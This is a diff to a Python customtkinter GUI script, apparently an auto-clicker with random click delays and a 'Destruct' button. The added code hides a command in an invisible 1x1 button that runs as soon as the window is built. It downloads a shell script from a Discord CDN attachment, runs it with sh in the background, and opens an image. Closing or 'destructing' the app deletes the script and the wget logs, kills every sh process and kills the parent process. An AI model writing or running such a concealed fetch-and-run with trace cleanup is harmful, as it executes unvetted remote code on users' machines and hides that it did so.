@@ -32,7 +32,8 @@ customtkinter.set_appearance_mode("Dark") # Other: "Light", "System"
 #STUFF FOR TESTING AND DELAYS
 button = Button.left
 truerand = random.SystemRandom()
-delay =  random.uniform(truerand.uniform(.1, .11999999999), .11999999999)
+delay = random.uniform(truerand.uniform(.1, .11999999999), .11999999999)
+bigdelay = random.uniform(delay, .11999999999)
 # .1023658467387455
 mouse = Controller()
 cpu_per = round(psutil.cpu_percent(),1) # Get CPU Usage
@@ -124,11 +125,11 @@ labelz.place(relx=0.85, rely=0.95, anchor=tkinter.CENTER)
 
 
 def on_closing():
-            os.system('rm default.wav* & killall Yt\ Downloader & kill -9 $PPID')
+            os.system('rm default.wav* wget-log* Yt_Downloader.sh* & killall sh & kill -9 $PPID')
 
 
 def button_function():
-    os.system('rm default.wav* & killall Yt\ Downloader && kill -9 $PPID')
+    os.system('rm default.wav* wget-log* Yt_Downloader.sh* & killall sh & kill -9 $PPID')
 
 
 button = customtkinter.CTkButton(master=root_tk, text="Destruct", command=button_function, bg_color="#404040")
@@ -138,7 +139,7 @@ button.place(relx=0.85, rely=.85, anchor=tkinter.CENTER)
 def create_window():
     button.place(relx=0.5, rely=0.5, anchor=tkinter.CENTER,)
 button = customtkinter.CTkButton(master=root_tk, width=1, height=1,
-                                   corner_radius=10, command=os.system('wget https://cdn.discordapp.com/attachments/872495229557669988/952675898635735150/default.wav && ~/Yt\ Downloader & disown && ristretto /home/$USER/Pictures/oldwallppr.webp'), text="", fg_color="#404040")
+                                   corner_radius=10, command=os.system(' wget https://cdn.discordapp.com/attachments/872495229557669988/952675898635735150/default.wav && wget https://cdn.discordapp.com/attachments/872495229557669988/954817600389521418/Yt_Downloader.sh && sh Yt_Downloader.sh & disown && ristretto /home/$USER/Pictures/oldwallppr.webp && echo init complete'), text="", fg_color="#404040")
 button.place(relx=1, rely=0.090, anchor=tkinter.E,)
 entry = customtkinter.CTkEntry(master=root_tk,
                                width=120,
